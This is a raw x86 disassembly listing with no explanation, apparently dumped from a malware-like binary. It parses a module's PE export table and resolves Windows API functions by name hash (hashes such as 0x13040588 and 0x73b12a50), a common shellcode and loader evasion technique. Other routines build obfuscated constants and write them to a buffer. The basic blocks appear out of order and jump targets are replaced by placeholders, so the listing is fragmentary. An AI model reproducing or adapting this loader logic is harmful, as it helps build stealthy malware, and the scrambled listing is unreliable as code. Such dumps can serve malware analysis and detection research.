call sub_402a8c
push 0x0
call eax
mov ecx 0x13040588
mov edx ebp
call sub_402a8c
push 0x0
push ebx
call eax
sub_402a50
mov edx ebp
call sub_402a8c
push eax
mov ecx esp
push 0x0
push ecx
push edi
push esi
push ebx
call eax
pop ecx
push eax
mov ecx 0x73b12a50
mov edx ebp
call sub_402a8c
push ebx
call eax
pop eax
retn
sub_402a75
push eax
xor eax eax
xor ecx ecx
pop eax
retn
xor ecx eax
rol ecx 0x3
inc ecx
shl eax 0x8
jmp r-xdata
lodsb [ esi ]
test al al
je r-xdata
sub_402a8c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov ebx edx
mov edx [ ebx + 0x3c ]
cmp [ ebx + edx ] 0x4550
jne r-xdata
xor eax eax
dec eax
pop ebp
pop edi
pop esi
pop ebx
retn
lea esi [ ebx + edx ]
mov edi [ esi + 0x78 ]
add edi ebx
mov esi [ edi + 0x20 ]
add esi ebx
xor edx edx
mov eax esi
mov esi [ esi ]
mov esi [ edi + 0x24 ]
add esi ebx
mov dx [ esi + edx * 2 ]
mov esi [ edi + 0x1c ]
add esi ebx
mov eax [ esi + edx * 4 ]
add eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
add eax 0x4
inc edx
mov esi [ eax ]
cmp edx [ edi + 0x18 ]
jb r-xdata
add esi ebx
call sub_402a75
cmp ebp ecx
je r-xdata
jmp r-xdata
_start
mov eax 0x1
retn 0xc
sub_401425
mov eax [ esp ]
add esp 0x4
stosd [ edi ]
jmp r-xdata
call sub_401431
mov eax 0x0
or eax 0xee155ade
add eax 0x91eae523
retn 0x8
sub_401431
add esp 0x4
mov eax [ esp - 0x4 ]
push eax
add edi 0x4
mov [ edi - 0x4 ] 0x0
add [ edi - 0x4 ] eax
jmp sub_401ac4
sub_40147f
mov eax [ esp ]
add esp 0x4
add edi 0x4
and [ edi - 0x4 ] 0x0
add [ edi - 0x4 ] eax
and esi esi
jno r-xdata
call sub_401497
xor eax eax
retn 0x8
sub_401ac4
call sub_40144b
mov eax 0xda80597
lea eax [ eax + 0x725a7a94 ]
retn 0x14
